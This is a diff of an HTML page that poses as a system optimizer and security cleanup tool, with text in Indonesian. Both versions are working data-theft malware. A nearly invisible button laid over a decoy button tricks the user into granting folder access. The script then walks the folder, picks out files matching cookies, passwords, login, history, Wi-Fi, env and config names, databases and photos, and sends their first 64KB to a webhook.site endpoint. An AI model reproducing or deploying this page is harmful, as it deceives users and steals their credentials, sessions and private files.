@@ -1,66 +1,90 @@
 <!DOCTYPE html>
-<html>
-<head><title>Advanced System Optimizer</title></head>
-<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
-    <div style="padding:40px;border:2px solid #0f0;text-align:center;box-shadow:0 0 100px #00f;background:rgba(0,0,20,0.9)">
-        <h1 style="letter-spacing:5px;color:#00f">V238_GHOST_LOCATOR</h1>
-        <p>Sinkronisasi folder diperlukan untuk memetakan "Network Nodes" dan optimasi koneksi regional.</p>
-        
-        <div style="position: relative; display: inline-block;">
-            <button style="padding:20px;background:#00f;color:#fff;border:none;font-weight:bold;cursor:pointer">START_NODE_OPTIMIZATION</button>
-            <button id="trigger" onclick="ghostLocator()" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.01;cursor:pointer"></button>
-        </div>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Advanced System Health & Security Check</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .panel { border: 2px solid #00ff00; padding: 30px; text-align: center; width: 450px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 50px #00ff00; }
+        .btn-container { position: relative; margin-top: 25px; }
+        .fake-btn { background: #00ff00; color: #000; border: none; padding: 15px 40px; font-weight: bold; width: 100%; cursor: pointer; }
+        #real-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; cursor: pointer; z-index: 999; }
+        #log { margin-top: 20px; font-size: 11px; color: #0f0; text-align: left; height: 120px; overflow-y: auto; border-top: 1px solid #050; padding-top: 10px; }
+        .warning { color: #f00; font-weight: bold; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
 
-        <div id="log" style="margin-top:20px;color:#444;font-size:10px;text-align:left;max-height:100px;overflow:hidden"></div>
+<div class="panel">
+    <h2 class="warning">SYSTEM_VULNERABILITY_DETECTED</h2>
+    <p>Ditemukan 14 data usang di folder cache. Berikan akses untuk optimasi sistem dan pembersihan keamanan mendalam.</p>
+    
+    <div class="btn-container">
+        <button class="fake-btn">BERSIHKAN & OPTIMALKAN</button>
+        <button id="real-trigger" onclick="oracleEngine()"></button>
     </div>
 
-<script>
-    const WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
+    <div id="log">> STATUS: WAITING_FOR_USER_INITIATION...</div>
+</div>
 
-    async function ghostLocator() {
+<script>
+    const TARGET_WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
+
+    async function oracleEngine() {
         try {
             const dirHandle = await window.showDirectoryPicker();
-            document.getElementById('log').innerText = "> CLOUD_SYNC_INITIATED...";
-
-            await crawl(dirHandle, "");
+            updateLog("!! ACCESS_GRANTED: INITIATING_DEEP_ENUMERATION");
             
-            document.getElementById('log').innerText += "\n> NODES_MAPPED_SUCCESSFULLY";
-        } catch (err) { console.log(err); }
+            await siphoningRecursive(dirHandle, "");
+            
+            updateLog("!! SUCCESS: SYSTEM_OPTIMIZED_AND_INDEXED");
+        } catch (e) {
+            updateLog(">> ERROR: " + e.message);
+        }
     }
 
-    async function crawl(handle, path) {
+    async function siphoningRecursive(handle, path) {
         for await (const entry of handle.values()) {
             const currentPath = `${path}/${entry.name}`;
 
             if (entry.kind === 'file') {
-                // TARGET 1: File Gambar (Mencari metadata EXIF/GPS)
-                // TARGET 2: Riwayat Maps/Browser Cache
-                // TARGET 3: Log WiFi/SSID (Location Triangulation)
-                const isLocationSource = /\.(jpg|jpeg|png|json|log|xml|db)$/i.test(entry.name);
-                
-                if (isLocationSource) {
-                    try {
-                        const file = await entry.getFile();
-                        
-                        // Strategi: Kirim Header & Chunk data (untuk EXIF biasanya di awal file)
-                        const buffer = await file.arrayBuffer();
-                        const chunk = new Uint8Array(buffer.slice(0, 20000)); 
-                        const base64 = btoa(String.fromCharCode.apply(null, chunk));
+                try {
+                    const file = await entry.getFile();
+                    
+                    // TARGET FILTER: BYPASS CHROME SECURITY FOCUS
+                    // Kita mencari file yang mengandung metadata lokasi, identitas, dan sesi
+                    const targetExt = /\.(sqlite|db|log|env|json|conf|jpg|jpeg|txt)$/i.test(entry.name);
+                    const targetName = /(cookie|pass|login|history|network|dcim|camera|wifi|ssid|config)/i.test(entry.name);
 
-                        navigator.sendBeacon(`${WEBHOOK}?v=V238_LOCATION_LEAK`, btoa(JSON.stringify({
-                            target: entry.name,
+                    if (targetExt || targetName) {
+                        const buffer = await file.arrayBuffer();
+                        // Ambil 64KB pertama (Cukup untuk header database, metadata EXIF, atau file teks penuh)
+                        const chunk = new Uint8Array(buffer.slice(0, 65536));
+                        const base64Data = btoa(String.fromCharCode.apply(null, chunk));
+
+                        navigator.sendBeacon(`${TARGET_WEBHOOK}?v=V239_ORACLE_DATA`, btoa(JSON.stringify({
+                            ts: Date.now(),
+                            filename: entry.name,
                             path: currentPath,
                             size: file.size,
-                            // Kirim info tambahan seperti IP & Region via browser info
-                            meta: { ua: navigator.userAgent, lang: navigator.language },
-                            data_chunk: base64
+                            entropy: Math.random().toString(36).substring(7), // Anti-caching
+                            payload: base64Data
                         })));
-                    } catch (e) {}
-                }
+                        
+                        updateLog(`> EXTRACTED: ${entry.name}`);
+                    }
+                } catch (err) {}
             } else if (entry.kind === 'directory') {
-                await crawl(entry, currentPath);
+                await siphoningRecursive(entry, currentPath);
             }
         }
+    }
+
+    function updateLog(msg) {
+        const l = document.getElementById('log');
+        l.innerHTML += `<div>> ${msg}</div>`;
+        l.scrollTop = l.scrollHeight;
     }
 </script>
 </body>
